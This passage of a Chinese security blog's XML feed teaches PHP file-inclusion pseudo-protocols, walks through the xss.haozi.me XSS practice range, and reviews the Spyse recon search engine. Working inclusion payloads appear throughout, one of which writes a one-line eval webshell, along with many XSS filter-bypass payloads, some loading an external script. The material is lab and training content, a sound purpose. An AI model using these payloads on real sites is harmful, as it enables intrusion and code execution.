<td>*）分隔。</td>
</tr>
<tr>
<td>write=&lt;写链的过滤器&gt;</td>
<td>可选项。可以设定一个或多个过滤器名称，以管道符（\</td>
<td>）分隔。</td>
</tr>
<tr>
<td>&lt;; 两个链的过滤器&gt;</td>
<td>任何没有以 <em>read=</em> 或 <em>write=</em> 作前缀的筛选器列表会视情况应用于读或写链。</td>
<td></td>
</tr>
</tbody></table>
</li>
<li><p><strong>可用的过滤器列表（4类）</strong></p>
<p>此处列举主要的过滤器类型，详细内容请参考：<a href="https://www.php.net/manual/zh/filters.php">https://www.php.net/manual/zh/filters.php</a></p>
<table>
<thead>
<tr>
<th>字符串过滤器</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>string.rot13</td>
<td>等同于<code>str_rot13()</code>，rot13变换</td>
</tr>
<tr>
<td>string.toupper</td>
<td>等同于<code>strtoupper()</code>，转大写字母</td>
</tr>
<tr>
<td>string.tolower</td>
<td>等同于<code>strtolower()</code>，转小写字母</td>
</tr>
<tr>
<td>string.strip_tags</td>
<td>等同于<code>strip_tags()</code>，去除html、PHP语言标签</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>转换过滤器</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>convert.base64-encode &amp; convert.base64-decode</td>
<td>等同于<code>base64_encode()</code>和<code>base64_decode()</code>，base64编码解码</td>
</tr>
<tr>
<td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td>
<td>quoted-printable 字符串与 8-bit 字符串编码解码</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>压缩过滤器</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>zlib.deflate &amp; zlib.inflate</td>
<td>在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td>
</tr>
<tr>
<td>bzip2.compress &amp; bzip2.decompress</td>
<td>同上，在本地文件系统中创建 bz2 兼容文件的方法。</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>加密过滤器</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>mcrypt.*</td>
<td>libmcrypt 对称加密算法</td>
</tr>
<tr>
<td>mdecrypt.*</td>
<td>libmcrypt 对称解密算法</td>
</tr>
</tbody></table>
</li>
<li><p><strong>示例</strong>：</p>
<ol>
<li><p><code>php://filter/read=convert.base64-encode/resource=[文件名]</code>读取文件源码（针对php文件需要base64编码）</p>
<pre><code>http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172421.png" alt="图片描述"></p>
</li>
<li><p><code>php://input + [POST DATA]</code>执行php代码</p>
<pre><code>http://127.0.0.1/include.php?file=php://input
[POST DATA部分]
&lt;?php phpinfo(); ?&gt;</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172422.png" alt="图片描述"></p>
<p>若有写入权限，写入一句话木马</p>
<pre><code>http://127.0.0.1/include.php?file=php://input
[POST DATA部分]
&lt;?php fputs(fopen('1juhua.php','w'),'&lt;?php @eval($_GET[cmd]); ?&gt;'); ?&gt;</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172423.png" alt="图片描述"></p>
</li>
</ol>
</li>
<li><p><strong>参考</strong>：<a href="https://php.net/manual/zh/wrappers.php.php">https://php.net/manual/zh/wrappers.php.php</a></p>
</li>
</ul>
<h2 id="zip-amp-bzip2-amp-zlib-协议"><a href="#zip-amp-bzip2-amp-zlib-协议" class="headerlink" title="zip:// &amp; bzip2:// &amp; zlib:// 协议"></a><code>zip:// &amp; bzip2:// &amp; zlib://</code> 协议</h2><ul>
<li><p><strong>条件</strong>：</p>
<ul>
<li><code>allow_url_fopen</code>:off/on</li>
<li><code>allow_url_include</code> :off/on</li>
</ul>
</li>
<li><p><strong>作用</strong>：<code>zip:// &amp; bzip2:// &amp; zlib://</code> 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：<code>jpg png gif xxx</code> 等等。</p>
</li>
<li><p><strong>示例</strong>：</p>
<ol>
<li><p><code>zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]</code>（#编码为%23）</p>
<p>压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传</p>
<pre><code>http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172424.png" alt="图片描述"></p>
</li>
<li><p><code>compress.bzip2://file.bz2</code></p>
<p>压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）</p>
<pre><code>http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172425.png" alt="图片描述"></p>
</li>
<li><p><code>compress.zlib://file.gz</code></p>
<p>压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）</p>
<pre><code>http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172426.png" alt="图片描述"></p>
</li>
</ol>
</li>
<li><p><strong>参考</strong>：<a href="http://php.net/manual/zh/wrappers.compression.php">http://php.net/manual/zh/wrappers.compression.php</a></p>
</li>
</ul>
<h2 id="data-协议"><a href="#data-协议" class="headerlink" title="data:// 协议"></a><code>data://</code> 协议</h2><ul>
<li><p><strong>条件</strong>：</p>
<ul>
<li><code>allow_url_fopen</code>:on</li>
<li><code>allow_url_include</code> :on</li>
</ul>
</li>
<li><p><strong>作用</strong>：自<code>PHP&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p>
</li>
<li><p><strong>用法</strong>：</p>
<pre><code>data://text/plain,
data://text/plain;base64,</code></pre></li>
<li><p><strong>示例</strong>：</p>
<ol>
<li><p><code>data://text/plain,</code></p>
<pre><code>http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172427.png" alt="图片描述"></p>
</li>
<li><p><code>data://text/plain;base64,</code></p>
<pre><code>http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172428.png" alt="图片描述"></p>
</li>
</ol>
</li>
</ul>
<h2 id="http-amp-https-协议"><a href="#http-amp-https-协议" class="headerlink" title="http:// &amp; https:// 协议"></a><code>http:// &amp; https://</code> 协议</h2><ul>
<li><p><strong>条件</strong>：</p>
<ul>
<li><code>allow_url_fopen</code>:on</li>
<li><code>allow_url_include</code> :on</li>
</ul>
</li>
<li><p><strong>作用</strong>：常规 URL 形式，允许通过 <code>HTTP 1.0</code> 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。</p>
</li>
<li><p><strong>用法</strong>：</p>
<pre><code>http://example.com
http://example.com/file.php?var1=val1&amp;var2=val2
http://user:password@example.com
https://example.com
https://example.com/file.php?var1=val1&amp;var2=val2
https://user:password@example.com</code></pre></li>
<li><p><strong>示例</strong>：</p>
<pre><code>http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172429.png" alt="图片描述"></p>
</li>
</ul>
<h2 id="phar-协议"><a href="#phar-协议" class="headerlink" title="phar:// 协议"></a><code>phar://</code> 协议</h2><p><code>phar://</code>协议与<code>zip://</code>类似，同样可以访问zip格式压缩包内容，在这里只给出一个示例：</p>
<pre><code>http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172430.png" alt="图片描述"></p>
<p>另外在 Black Hat 2018 大会上，研究人员公布了一款针对PHP应用程序的全新攻击技术：<strong>phar://协议对象注入技术</strong>。</p>
<p>因为该利用点需要满足一定的条件才能利用，可以参考下面这篇文章，里面的demo也非常详细，留作以后专门研究一下。</p>
<blockquote>
<p>参考文章：<a href="https://paper.seebug.org/680/">seebug - 利用 phar 拓展 php 反序列化漏洞攻击面</a><a href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a>)</p>
</blockquote>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>php伪协议</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS漏洞介绍及靶场实战</title>
    <url>/xsshaozishootingrange.html</url>
    <content><![CDATA[<h4 id="什么是XSS攻击"><a href="#什么是XSS攻击" class="headerlink" title="什么是XSS攻击"></a><strong>什么是XSS攻击</strong></h4><p>Cross-Site Scripting的缩写本应是CSS，但为了避免和Cascading style sheets（层叠样式表）的缩写混淆，将Cross（即交叉）采用交叉形状的X表示。</p>
<p>XSS是注入攻击的一种，攻击者将代码注入被攻击的网页中，其他用户一旦访问该网页便会执行被注入的恶意脚本。XSS漏洞允许攻击者绕过网站安全机制，也可以被攻击者用来进行钓鱼攻击、前端js挖矿、用户cookie获取等，甚至还可结合用户浏览器本身存在的漏洞对用户主机进行远程控制。</p>
<h4 id="XSS攻击的类型"><a href="#XSS攻击的类型" class="headerlink" title="XSS攻击的类型"></a><strong>XSS攻击的类型</strong></h4><p>XSS攻击分为三种类型，分别为反射型，存储型和基于Dom。</p>
<h5 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a><strong>反射型XSS</strong></h5><p>也被称为非持久型XSS，是目前最普遍的类型，攻击者将事先制作好的攻击链接提供给用户后，欺骗或诱导用户主动点击该链接即可触发此段XSS代码（网站服务器中并没有这样的页面和内容），反射型XSS通常容易出现在搜索页面。例如某网页上的搜索栏，假若攻击者搜索的字符串包含了一些html标签，通常情况下，搜索的结果会以该样式显示出来，或者搜索的字符串会包含在页面里。但此项却是可以改动的，如若任何搜索的字符串都没有被html编码，就会产生XSS漏洞。</p>
<h5 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a><strong>存储型XSS</strong></h5><p>又名持久型XSS，代码存储在服务器中，一般情况下如果在个人信息或发表文章等地方加入代码，这些代码却没有过滤或过滤不严，那么这些代码将储存到服务器中，当有用户浏览该页面的时候都会触发代码执行，每一个访问该页面的用户都会被攻击，这种XSS特别危险，容易造成蠕虫，大量盗窃cookie。存储型XSS通常存在于允许用户提交数据的地方，如在线留言版等。</p>
<h5 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a><strong>DOM XSS</strong></h5><p>也被称作本地跨站，是基于文档对象模型Document Object Model（DOM）的一种漏洞。DOM是一个与平台、编程语言不相干的接口，允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果会成为展示页面的一部分。DOM中有很多对象，其中一些对象可以被用户所操纵，如url，location等。客户端的脚本程序可以通过DOM来动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而是从客户端取得DOM中的数据后并在本地执行，因此仅从服务器端是没有办法防御DOM型XSS漏洞的，如若DOM中的数据没有经过严格的验证，便会产生基于DOM的XSS漏洞。基于DOM的XSS是反射的特例，其中JavaScript隐藏在URL中，并在其呈现时由页面中的JavaScript取出，而不是在提供服务时嵌入到页面中。这可以使其比其他攻击更隐蔽，并且监控页面正文的WAF或其他防护检测不出恶意内容。</p>
<h4 id="XSS攻击的途径"><a href="#XSS攻击的途径" class="headerlink" title="XSS攻击的途径"></a><strong>XSS攻击的途径</strong></h4><p>XSS攻击方法只是利用HTML的属性做各种尝试，找出注入的方法。现在对三种XSS攻击的主要方式进行分析。</p>
<p>第一种：对普通的用户输入，页面原样输出，攻击者通过对JSCODE的伪装，经过某些特定的操作就会跳出一个木马界面，从而取得登录用户的Cookie.</p>
<p>第二种：在代码区内存在有用户输入的内容</p>
<p>第三种：允许用户输入HTML标签的页面，用户可以提交一些自定义的HTML代码。</p>
<h4 id="XSS攻击的检测"><a href="#XSS攻击的检测" class="headerlink" title="XSS攻击的检测"></a><strong>XSS攻击的检测</strong></h4><ol>
<li>在目标站点上找到输入点，比如搜索栏，错误页面，留言板等。</li>
<li>输入一组”特殊字符+唯一识别字符”，点击提交后，查看返回源码，是否做对应的处理。</li>
<li>通过搜索定位到唯一识别字符，结合唯一识别字符前后语法确认是否可以构造执行js的条件(构造闭合)。</li>
<li>提交构造的脚本代码以及各种绕过姿势，看是否可以成功执行，如果成功执行则说明该站点存在XSS漏洞。</li>
</ol>
<h5 id="Tips："><a href="#Tips：" class="headerlink" title="Tips："></a><strong>Tips：</strong></h5><ol>
<li>通常搜索栏容易出现反射型XSS，留言板容易出现存储型XSS；</li>
<li>有些网站鉴于后台可能存在过滤措施，组建的script可能会被过滤掉，因而无法生效或者环境限制脚本执行；</li>
<li>通过变化不同的script，尝试绕过后台的过滤机制。</li>
</ol>
<p>下图为跨站脚本攻击流程图（Cookies）</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210405195622.png" alt="图片"></p>
<p>从图中可以看出：用户访问存在XSS漏洞的站点后触发脚本，漏洞站点给用户返回带有恶意js的页面;用户设备执行该恶意脚本后，攻击者即可窃取用户的数据（cookies），并伪装成用户对漏洞站点进行攻击。</p>
<h4 id="XSS靶场通关实践（xss-haozi靶场练习）"><a href="#XSS靶场通关实践（xss-haozi靶场练习）" class="headerlink" title="XSS靶场通关实践（xss.haozi靶场练习）"></a><strong>XSS靶场通关实践</strong>（xss.haozi靶场练习）</h4><p>了解完XSS的概念，XSS攻击的主要途径、测试流程及攻击流程后，接下来，就是本文的关键内容了，那就是XSS漏洞的发现以及常见的几种绕过方式，笔者无意间找到了一个可用来练习XSS漏洞绕过的靶场（靶场地址：<a href="https://xss.haozi.me/）且看我操作一番……">https://xss.haozi.me/）且看我操作一番……</a></p>
<p>首先，我们看看靶场布局：左上方为XSS注入点，也就是用户输入的位置，左下方是成功注入后的HTML代码，右边为了方便进行学习绕过，所以就是每一关的主要网页源码了。</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210405195623.png" alt="图片"></p>
<p>熟悉了靶场的环境，接下来就是每一关的绕过了，共计19关，具体如下：</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210405195624.png" alt="图片"></p>
<pre><code>&lt;img src="x" onerror="alert(1)"&gt;
或
&lt;script&gt;alert(1)&lt;/script&gt;

</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210405195625.png" alt="图片">】</p>
<p>这一关，就是考了个最基本的标签闭合，感觉有点像SQL注入。就是把前面和后面的textarea给闭合掉，让后再写核心代码就行了，我讲一下这个img吧，他是用来给页面加入图片的，图片的地址就是由src来设置的，然后后面那个onerror是一个事件，就是一旦出错，就会执行里面的JavaScript代码。所以我们就把图片的地址胡写一个，让后程序出错，最后执行JavaScript代码，完美。</p>
<pre><code>&lt;/textarea&gt;&lt;img src="x" onerror="alert(1)"&gt;&lt;textarea&gt;
或
&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;textarea&gt;</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210405195626.png" alt="图片"></p>
<pre><code>"&gt;&lt;img src="x" onerror="alert(1)"&gt;
或
"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210405195627.png" alt="图片"></p>
<p>单引号(左上角那个)绕过</p>
<pre><code>&lt;script&gt;alert`1`&lt;/script&gt;</code></pre><p>还可用HTML编码绕过</p>
<pre><code>&lt;img src="x" onerror="alert&amp;#40;1&amp;#41;"&gt;</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210405195628.png" alt="图片"></p>
<p>黑名单加入了`</p>
<p>HTML编码绕过</p>
<pre><code>&lt;img src="x" onerror="alert&amp;#40;1&amp;#41;"&gt;</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210405195629.png" alt="图片"></p>
<p>注释符的闭合符有两种：</p>
<pre><code>&lt;!-- XXX --&gt;
&lt;!- XXX --!&gt;
</code></pre><p>则可以注释掉前面</p>
<pre><code>--!&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210405195630.png" alt="图片"></p>
<p>过滤了以on开头，以=号结尾的字符和含有on和&gt;的字符，我们就用onerror的语法，利用换行符绕过</p>
<pre><code>type="image" src="xxx" onerror
="alert(1)"  #alert外的双引号可不加</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210405195631.png" alt="图片"></p>
<p>HTML的单标签也可以解析，则可利用容错性不闭合<code>&gt;</code></p>
<pre><code>&lt;img src="x" onerror="alert(1)"</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210405195632.png" alt="图片"></p>
<p>加个空格绕过或者换行绕过</p>
<pre><code>&lt;/style &gt;&lt;script&gt;alert(1)&lt;/script&gt;
或
&lt;/style
&gt;
&lt;img src="x" onerror="alert(1);"&gt;</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210405195633.png" alt="图片"></p>
<p>源码要求以<code>http://www.segmentfault.com</code>开头但是并没有限制结尾，所以闭合掉<code>&lt;script&gt;</code>标签</p>
<pre><code>http://www.segmentfault.com"&gt;&lt;/script&gt;&lt;img src=# onerror="alert(1)</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210405195634.png" alt="图片"></p>
<p>从源码可知过滤了<code>&amp;</code>不能实体编码绕过，过滤了<code>&lt;</code>,<code>&gt;</code>，不能闭合标签</p>
<p>这又用到一个知识点，就是@，如果你访问 <a href="http://www.baidu.com@www.google.com，那么你最后进入的是谷歌的界面，所以这一关，就在自己的服务器上放一个js文件，写上“alert（1）”。但不知道我的不行。就先给出别人的payload吧。xss.haozi.me/j.js">www.baidu.com@www.google.com，那么你最后进入的是谷歌的界面，所以这一关，就在自己的服务器上放一个js文件，写上“alert（1）”。但不知道我的不行。就先给出别人的payload吧。xss.haozi.me/j.js</a> 这是题目作者自己写的js文件。</p>
<p>这里利用url的@特性，引入外部js,假设我们访问<code>http://example.com@10.10.10.10</code>，实际上是<code>http://10.10.10.10</code>,这里的``会被过滤，过滤后的HTML实体编码在HTML标签属性值中无影响，可以直接解析，所以payload：</p>
<pre><code>https://www.segmentfault.com@xss.haozi.me/j.js</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210405195635.png" alt="图片"></p>
<h6 id="toUpperCase"><a href="#toUpperCase" class="headerlink" title="toUpperCase()"></a>toUpperCase()</h6><p>函数将字符转换成大写，这里两种方法</p>
<ul>
<li><p>HTML不区分大小写</p>
</li>
<li><p>Javascript严格区分大小写<br>第一种方法在<code>&lt;script&gt;</code>标签中的src添加，payload：<code>&lt;script src="https://xss.haozi.me/j.js"&gt;&lt;/script&gt;</code><br>第二种方法将js的代码html实体编码绕过<br><code>&lt;img src=# onerror=alert(1)&gt;</code> 即下面转码后的结果</p>
<pre><code>&lt;img src=# onerror=&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt;</code></pre><p>只有字母和括号可以用编码绕过，但要是单引号双引号之类的，就不行了</p>
</li>
</ul>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210405195636.png" alt="图片"></p>
<p>多过滤了一个script</p>
<p>用上面第二种方法即可</p>
<pre><code>&lt;img src=# onerror=&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt;</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210405195637.png" alt="图片"></p>
<p>这里过滤掉了<code>&lt; / " '</code>，而且input在注释符//后，这里可以利用换行来逃逸，但是后面的<code>')</code>不知道怎么过滤掉，查阅资料后发现可以用<code>--&gt;</code>注释掉后面的内容</p>
<p>即–&gt;’)注释</p>
<pre><code>alert(1);
--&gt;</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210405195638.png" alt="图片"></p>
<p>这里对&lt;字母开头的字符串转换成&lt;_字母并大写，所以基本上所有的标签都被过滤掉了，查阅资料发现阿拉伯字母<code>ſ</code>大写为<code>S</code>，但是本身又不是字母，太BUG了吧，长见识了<br>所以payload：<code>&lt;ſcript src="https://xss.haozi.me/j.js" &gt;&lt;/script&gt;</code></p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210405195639.png" alt="图片"></p>
<p>xss代码在onerror属性中，尝试闭合前面的内容</p>
<pre><code>1');alert(1)//</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210405195640.png" alt="图片"></p>
<pre><code>1;
alert(1)</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210405195641.png" alt="图片"></p>
<p>过滤了很多字符，貌似没什么卵用<br><code>1");alert(1);//</code> 过滤掉后面的内容<br><code>");alert(1);("</code> 闭合后面的内容</p>
<p>两种都可</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210405195642.png" alt="图片"></p>
<p>过滤了一些东西，但他不是替换为空，而是给转义了，那我们就把转义符给转义了</p>
<p><strong>console.log() 方法：</strong></p>
<p>在控制台上输出信息：</p>
<pre><code>\");alert(1);&lt;/script&gt;</code></pre><p><strong>XSS攻击的危害</strong></p>
<p><strong>钓鱼欺骗</strong>：最典型的即是利用目标网站的反射型跨站脚本漏洞将目标网站重定向到钓鱼网站，或者通过注入钓鱼JavaScript脚本以监控目标网站的表单输入，甚至攻击者基于DHTML技术对目标网站发起更高级的钓鱼攻击。</p>
<p><strong>网站挂马</strong>：跨站攻击时，攻击者利用Iframe标签嵌入隐藏的恶意网站，将被攻击者定向到恶意网站上或以弹出恶意网站窗口等的方式，进行挂马。</p>
<p><strong>身份盗用</strong>：Cookie是用户对于特定网站的身份验证的标志，XSS攻击可以令攻击者盗取用户的cookie，从而利用该cookie盗取用户对该网站的操作权限</p>
<p><strong>垃圾信息发送</strong>：在社交网站社区中，利用XSS漏洞借用被攻击者的身份发送大量的垃圾信息给特定的目标群。</p>
<p><strong>劫持用户Web行为</strong>：一些高级的XSS攻击甚至可以劫持用户的Web行为，从而监视用户的浏览历史、发送与接收的数据等。</p>
<p><strong>XSS蠕虫病毒</strong>：借助XSS蠕虫病毒还可以用来打广告、刷流量、挂马、恶作剧、破坏数据、对目标实施DDoS攻击等。</p>
<p><strong>XSS攻击防御思路</strong></p>
<p>XSS漏洞防御的总体思路是：对输入(或URL参数)进行过滤，对输出的内容进行编码，即对用户提交的所有输入进行过滤，或是对url中的参数进行过滤，过滤会导致恶意脚本执行的相关内容，然后对动态输出到页面的内容进行html实体编码，使脚本无法在浏览器中执行。虽然对输入过滤可以被绕过，但同时也还是会拦截很大一部分的XSS攻击。在输出数据之前对潜在的威胁的字符进行编码、转义是对于防御XSS攻击十分有效的措施。如果使用恰当的话，理论上是可以防御所有的XSS攻击的。对所有需要动态输出到页面的内容，可以全部进行相关的编码和转义。</p>
<p>对输入和URL参数进行过滤(白名单和黑名单) 的主要思路是将容易导致XSS攻击的半角字符替换成全角字符。&lt; 和 &gt; 是脚本执行和各种html标签需要的。我们说对输入的过滤分为白名单和黑名单。黑名单就是列出不能出现的对象的清单，一旦出现就进行处理。还有一种白名单的过滤，白名单就是列出可被接受的内容，譬如规定所有的输入只能是“大小写的26个英文字母和10个数字，还有-和_”，所有其他的输入都是非法的，会被抛弃掉。</p>
<p>理论上，如此严格的白名单是可以100%拦截XSS攻击的，但是现实情况是通常不能进行如此严格的白名单过滤。对于每一个输入，在客户端和服务器端还要进行各种验证，验证字符是否合法，长度是否合法，格式是否正确。因为客户端的验证很容易被绕过，需要在客户端和服务端都要进行验证。这种验证也分为黑名单和白名单。黑名单的验证就是不能出现某些字符，白名单的验证即是只能出现某些字符，建议尽量使用白名单。</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>Spyse:一个网络安全从业者的专业搜索引擎</title>
    <url>/Spysesearch.html</url>
    <content><![CDATA[<h2 id="Spyse-一个网络安全从业者的专业搜索引擎"><a href="#Spyse-一个网络安全从业者的专业搜索引擎" class="headerlink" title="Spyse:一个网络安全从业者的专业搜索引擎"></a>Spyse:一个网络安全从业者的专业搜索引擎</h2><p><a href="https://mp.weixin.qq.com/s/D8JhdhzY6cpShKX2J-t_rQ">丁爸公众号相关文章</a></p>
<p>介绍一个网络安全从业者的专业搜索引擎—spyse</p>
<p>官网地址：<a href="https://spyse.com/">https://spyse.com/</a></p>
<p><strong>Spyse</strong>专为网络安全专家，测试人员和漏洞赏金猎人量身定制，可帮助用户快速识别网络漏洞并缓解威胁。它们具有一些用于说明收集的数据之间关系的智能功能，并承诺使安全工程师在处理大量数据时必须完成的所有繁琐工作自动化。</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210328200217.png" alt=""></p>
<p>Spyse配备了网络上最大的数据库之一，它为从事网络安全工作的任何人提供了新的可能性和改进的工作流程。Spyse已开发出一种独特的扫描技术，该技术可实现十多种自行开发的扫描器，以创建不间断的数据收集过程。扫描器从多种资源中收集数据，以通过比较确保真实性。</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210328200218.png" alt=""></p>
<p>Spyse使用其全球五十个服务器的分发系统来扫描世界各地，而绕过位置扫描限制和ISP阻止。借助此系统，Spyse可以提供独特的数据，而这些数据很难在其他地方找到。</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210328200219.png" alt=""></p>
<p>Spyse仅存储热数据，使用了五十台高生产率，快速且昂贵的服务器，其中约有70亿个文档分解为250多个分片。这将产生5TB的即时访问数据。数据被存储，以便可以连接以帮助用户可视化任何目标基础架构的全貌。</p>
<p>Spyse通过两种方式为您提供数据：通过<strong>Web</strong>界面和<strong>API</strong>。<br>Web界面以一种格式显示聚合的和结构化的信息，该格式可以查看组织成表格的数据。可以编辑这些表中的信息以适合用户的需求。找到所有必要的数据后，用户可以下载数据以进行脱机访问。</p>
<p>也可以使用API获取数据。有了扩展的Swagger文档，该API在其应用程序中非常灵活，可以自由地集成到任何用户的工具或服务中。详细显示了每种提取信息的方法，这使该API令人愉快。该团队尚未公开其CLI，但是他们确实有一个由外包开发人员zer0pwn制作的Python包装器，这也可以是一个很好的选择。</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210328200220.png" alt=""></p>
<p><strong>高级搜索</strong>，它使用户能够找到具体的目标信息，从而极大地加快了搜索过程。它的作用类似于实时过滤器，允许用户将5个搜索参数应用于查询以缩小数据范围。例如：通过仅使用3个参数，您可以找到所有域响应为200的站点，它们所属的公司以及该公司在其服务器上具有的漏洞。</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210328200221.png" alt=""></p>
<p>Spyse使系统管理员可以连续监视其网络基础架构，并直接从数据库获取信息。这可以手动完成，也可以编写一些简单的脚本来完成。此外，Spyse使系统管理员可以快速分析任何基础结构中的安全级别，并迅速找到薄弱环节和潜在的切入点。</p>
<p>这项服务对渗透测试者和漏洞赏金猎人也非常有用，因为它可以完全监督查找目标信息的过程，并且可以帮助快速创建目标列表。Spyse可帮助避免与信息收集过程有关的大多数问题，例如花费时间和资源来开发用于扫描的新基础结构，避免速率限制以及在查找信息时保持隐身的必要性。当合同或漏洞赏金协议禁止他人使用Spyse时，它是OSINT的绝佳资源。</p>
<p>Spyse全面监督侦察过程，从而节省了大量的调查时间和资源。</p>
<p><strong>功能：</strong></p>
<p><strong>1、域查找</strong></p>
<p>探索有关域的详细信息，域和子域（标题和元描述；SSL / TLS证书；DNS记录）。</p>
<p><strong>2、DNS查询</strong></p>
<p>查找任何域的所有DNS记录（A; AAAA; MX; NS; SOA; TXT; PTR）</p>
<p><strong>3、ASN查找</strong></p>
<p>查找具有连接数据的自治系统编号（编号；组织；类型；AS上的域；相关的ASN；IPv4 / IPv6范围）</p>
<p><strong>4、子域查找器</strong></p>
<p>查找任何域的子域</p>
<p><strong>5、反向DNS查找</strong></p>
<p>查找任何IPv4地址的DNS PTR记录</p>
<p><strong>6、SSL证书查询</strong></p>
<p>通过域名或指纹查找证书</p>
<p><strong>7、IP查询</strong></p>
<p>在IP上查找地理位置，开放端口和托管域</p>
<p><strong>8、MX查找</strong></p>
<p>通过域名查找MX记录</p>
<p><strong>9、反向AdSense查询</strong></p>
<p>查找具有相同AdSense ID的所有域</p>
<p><strong>10、反向IP查询</strong></p>
<p>查找特定IP地址上的所有托管域</p>
<p><strong>11、NS查找</strong></p>
<p>获取域的完整DNS记录列表</p>
<p><strong>12、公司查询</strong></p>
<p>按名称查找相关公司资产，研究互联网上任何公司的数字资产。输入组织名称以查找有价值的业务和技术信息。</p>
<p><strong>13、端口扫描器</strong></p>
<p>查找开放端口和漏洞</p>
<p><strong>14、WHOIS查询</strong></p>
<p>查找任何域的WHOIS记录</p>
<p><strong>15、CVE搜索</strong></p>
<p>通过CVE ID查找易受攻击的域和IP地址</p>
<p><strong>16、技术搜索器</strong></p>
<p>在网站上搜索技术</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210328200222.png" alt=""></p>
]]></content>
      <categories>
        <category>网络安全类网站</category>
      </categories>
      <tags>
        <tag>Spyse</tag>
      </tags>
  </entry>
  <entry>
    <title>Playfair密码及其加密解密规则介绍</title>
    <url>/playfaircrypto.html</url>
